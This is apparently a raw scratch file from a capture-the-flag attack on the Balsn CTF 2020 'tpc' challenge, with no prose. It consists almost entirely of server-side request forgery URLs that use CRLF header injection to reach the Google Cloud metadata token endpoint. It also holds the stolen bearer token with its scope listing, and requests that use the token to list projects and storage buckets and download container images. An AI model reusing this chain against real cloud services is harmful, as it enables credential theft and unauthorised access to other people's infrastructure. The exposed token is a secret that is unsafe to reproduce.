+{"access_token":"ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q","expires_in":3416,"token_type":"Bearer"}
+
+https://compute.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://compute.googleapis.com/compute/v1/projects/909684563558?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/compute/v1/projects/909684563558/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+{ "issued_to": "102193360015934362205", 
+"audience": "102193360015934362205", 
+"scope": "https://www.googleapis.com/auth/trace.append
+ https://www.googleapis.com/auth/monitoring.write
+  https://www.googleapis.com/auth/service.management.readonly
+   https://www.googleapis.com/auth/servicecontrol
+    https://www.googleapis.com/auth/logging.write 
+    https://www.googleapis.com/auth/devstorage.read_only",
+    
+ "expires_in": 2952, "access_type": "online" }
+
+ https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com
+
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q
+
+https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+
+{ "kind": "storage#bucket", "selfLink": "https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com", "id": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com", "name": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com", "projectNumber": "909684563558", "metageneration": "1", "location": "ASIA", "storageClass": "STANDARD", "etag": "CAE=", "timeCreated": "2020-10-03T05:12:42.035Z", "updated": "2020-10-03T05:12:42.035Z", "iamConfiguration": { "bucketPolicyOnly": { "enabled": false }, "uniformBucketLevelAccess": { "enabled": false } }, "locationType": "multi-region" }
+
+https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:8e402f1a9c577ded051c1ef10e9fe4492890459522089959988a4852dee8ab2c?generation=1605158578332910&alt=media %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QcQCb9k6lJXPRqUDCw4MwyOMhWgnCmsCW6-Gu4v5Qqk0zQcrwtuo8ZkupTK3RHyHepguGTJZ5qd_IH6iWj-f5PKES-OcB5ObG5OvSO3UNTpAGru4_AYz1f5TxEXK4M4A3-uJOqv1OnjnWcVi_Ov7qnHfVWps91CWqPpPtn306bTvoHQtEE6CyLkFIEHQhaOz3UKWE_C7Q%0D%0ATEST%3A%20123%3A8080/test/?test=a
